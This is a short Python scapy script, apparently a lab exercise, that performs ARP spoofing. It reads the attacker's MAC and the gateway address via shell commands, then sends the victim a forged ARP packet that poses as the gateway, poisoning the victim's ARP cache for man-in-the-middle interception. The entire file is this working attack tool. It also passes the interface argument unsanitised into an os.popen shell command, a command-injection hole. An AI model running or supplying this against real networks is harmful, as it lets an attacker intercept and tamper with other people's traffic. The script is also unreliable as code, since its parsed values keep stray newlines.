from scapy.all import *
import sys
import subprocess
import os
if len(sys.argv) != 4:
	print ("[+] Usage : python send_arp.py <interface> <VICTIM_IP> <MY_IP>")
	sys.exit(1)

# argvs..
interface = sys.argv[1]
Victim_ip = sys.argv[2]
Attacker_ip = sys.argv[3]
#print (interface, Victim_ip, Attacker_ip)

# get my mac affr
Attacker_mac = os.popen("ifconfig -a| grep "+interface+" |awk -F ' ' '{print $5}'").read()
print("[+]My MAC >>",Attacker_mac)

# gw ip addr 
gw_ip = os.popen("route | grep default |awk -F ' ' '{print $2}'").read()
print ("[+]GW >>>>",gw_ip)

# arp request
#arp = sr1(ARP(op=ARP.who_has, psrc=Attacker_ip, pdst=Victim_ip))
#p_summary = arp.summary()
#p_split = p_summary.split()
#Victim_mac = p_split[3]
#print ("[+]Victim MAC >",Victim_mac)

# send arp spoof
arp_packet = Ether()/ARP(op="who-has", hwsrc=Attacker_mac,psrc=gw_ip,pdst=Victim_ip)
send(arp_packet)
